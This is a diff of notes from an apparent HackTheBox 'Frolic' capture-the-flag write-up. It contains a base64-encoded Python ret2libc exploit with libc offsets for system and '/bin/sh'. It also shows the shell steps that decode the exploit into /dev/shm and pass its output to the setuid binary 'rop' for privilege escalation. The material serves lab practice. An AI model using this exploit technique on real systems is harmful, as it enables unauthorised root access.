@@ -546,7 +546,7 @@ HOST: http://frolic.htb:9999:
    Result:
       aW1wb3J0IHN0cnVjdAoKYnVmZnIgPSAiQSIgKiA1MgpsaWJjID0gMHhiN2UxOTAwMApzeXN0ZW0gPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAzYWRhMCkKZXhpdCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMDJlOWQwKQpiaW5zaCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMTViYTBiKQoKcGF5bG9hZCA9IGJ1ZmZyICsgc3lzdGVtICsgZXhpdCArIGJpbnNoCgpwcmludCBwYXlsb2FkCg==
 
-   Notes: Copied and pasted decoded base64 to: www-data@frolic:/dev/shm/exploit.py
+   Notes: Copied and pasted encoded base64 file to: www-data@frolic:/dev/shm/exploit.py using the following steps:
    www-data@frolic:/dev/shm$ echo -n <base64-code> |base64 -d > exploit.py
    www-data@frolic:/dev/shm$ cd /home/ayush/.binary/
    www-data@frolic:/home/ayush/.binary/$ ./rop $(python /dev/shm/exploit.py)
